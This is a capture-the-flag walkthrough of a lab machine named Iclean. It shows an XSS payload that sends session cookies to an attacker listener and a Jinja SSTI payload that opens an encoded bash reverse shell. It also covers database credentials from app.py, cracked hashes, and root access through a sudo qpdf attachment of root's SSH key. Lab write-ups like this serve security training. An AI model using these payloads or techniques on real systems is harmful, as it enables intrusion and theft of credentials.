## [Iclean]

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, XXS, SSTI, SQL Enumeration, Priv Esc, Linux

#### Enumeration
- run nmap, we get port `22` and `80`
- upon visiting port `80` we get the domain name of the site `capiclean.htb`
- run `wfuzz`, no subdomains found
- run `feroxbuster`, found `/quote` endpoint
![[Medium/Unix/Iclean/xss.png]]
- attempted with `XSS` injection into `service` parameter
![[xss cookie.png]]
- we get a connection back from remote
```bash
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.198.132] 59740
GET / HTTP/1.1
Host: 10.10.14.37:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
- we can craft  a payload to get user cookie
```js
<img src=x onerror=fetch("http://10.10.14.37:8000/"+document.cookie)>Carpet%2bCleaning</img>&service=Tile+%26+Grout&service=Office+Cleaning&email=123%40123.com
```
- we get a user cookie, add the cookie in developer mode
```bash
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.198.132] 51012
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aLz_-A.LB3wtDynk1Keg3ODxltsu0-wN3M HTTP/1.1
Host: 10.10.14.37:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
- from `feroxbuster` scan we also get `/dashboard` endpoint
- attempt to visit `/dashboard`, we get few options
![[dashboard endpoint.png]]
#### Initial Foothold 
- going through the options one by one
![[generate invoice.png]]
- found that `Insert QR Link to generate Scannable invoice` is vulnerable to `SSTI` 
![[generate qr.png]]
- testing with `{{ 7 * 7 }}`, we get the result of 49 in the image tag
![[Medium/Unix/Iclean/ssti.png]]
- inject with RCE
```payload
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo -n YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM3LzkwMDEgICAwPiYxJw== | base64 -d | bash')|attr('read')()}select }
```
- get a connection back as `www-data`
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.198.132] 41928
bash: cannot set terminal process group (1203): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ whoami
whoami
www-data
```
- searching through the default directory, cat `app.py` we get the database credential
```python
secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```
- login to database and enumerate 
```sql
mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```
- use `Crack Station` we get the plaintext password for user `copnsuela:simple and clean`
#### Lateral Movement (If any)

#### Privilege Escalation
- run `sudo -l`
```bash
$ sudo -l
[sudo] password for consuela: 
simple and clean
Sorry, try again.
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```
- `qpdf` is a tool that transformation on `PDF` files
- `qpdf` allows user to create attachments on `PDF` files and since we can run `qpdf`  as root we can attempt to add the root user's private ssh key as an attachement
```bash
## create attachment
sudo /usr/bin/qpdf /tmp/dummy.pdf --add-attachment /root/.ssh/id_rsa
-- root_key.pdf
## view attachment/ root's private ssh key
qpdf root_key.pdf --show-attachment=id_rsa
```
- use `ImageMagick` to create the `PDF`
```bash
convert -size 595x842 xc:white -gravity center -annotate 0 'This is a dummy PDF' dummy.pdf
```
- ssh into target with root user's private key
```bash
$ ssh root@10.129.198.132 -i ./root.rsa 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sun Sep  7 01:44:19 PM UTC 2025




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@iclean:~# ls
root.txt  scripts
```
  #### Resources

#### Lesson Learned
